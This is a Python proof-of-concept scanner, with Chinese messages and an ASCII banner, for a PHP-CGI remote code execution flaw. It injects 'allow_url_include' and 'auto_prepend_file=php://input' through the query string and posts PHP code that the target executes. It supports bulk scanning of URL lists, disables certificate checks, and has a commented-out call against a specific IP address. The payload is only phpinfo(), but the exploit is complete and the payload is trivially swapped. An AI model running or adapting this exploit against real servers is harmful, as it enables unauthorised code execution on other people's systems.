import requests
import argparse

def phpcgi(url):
    try:
        attackurl = url + '/php-cgi/php-cgi.exe?%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input'
        data = "<?php phpinfo();?>"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
            'REDIRECT-STATUS': '1'}
        req = requests.post(attackurl, headers=headers, data=data,verify=False) #
        contains_all_required_strings = all(

            string in req.text for string in ["PHP Version", "Build Date"]

        )
        if req.status_code == 200 and contains_all_required_strings:
            print(f'[+]{attackurl}存在漏洞')
        else:
            print('[-]不存在漏洞')
    except Exception as e:
        print("无法访问该网站")
def checkFile(filename):
    with open(filename,"r") as f:
        for readline in f.readlines():
            phpcgi(readline)

def startwith():

    logo = """
  _____  _    _ _____         _____ _____ _____      _____   _____ ______ 
 |  __ \| |  | |  __ \       / ____/ ____|_   _|    |  __ \ / ____|  ____|
 | |__) | |__| | |__) |_____| |   | |  __  | |______| |__) | |    | |__   
 |  ___/|  __  |  ___/______| |   | | |_ | | |______|  _  /| |    |  __|  
 | |    | |  | | |          | |___| |__| |_| |_     | | \ \| |____| |____ 
 |_|    |_|  |_|_|           \_____\_____|_____|    |_|  \_\\_____|______|
    """
    # 修改横幅信息
    print(logo)

#phpcgi('http://103.236.201.41')
if __name__ == "__main__":
    startwith()
    parser = argparse.ArgumentParser(description="检测PHP CGI 平台远程代码执行漏洞工具")
    parser.add_argument('-f', '--filename', type=str, help='批量检验URL，输入URL文件名')
    parser.add_argument('-u', '--url', type=str, help='检测单个URL')
    args = parser.parse_args()
    if args.url:
        phpcgi(args.url)
    elif args.filename:
        checkFile(args.filename)
    else:
        parser.print_help()

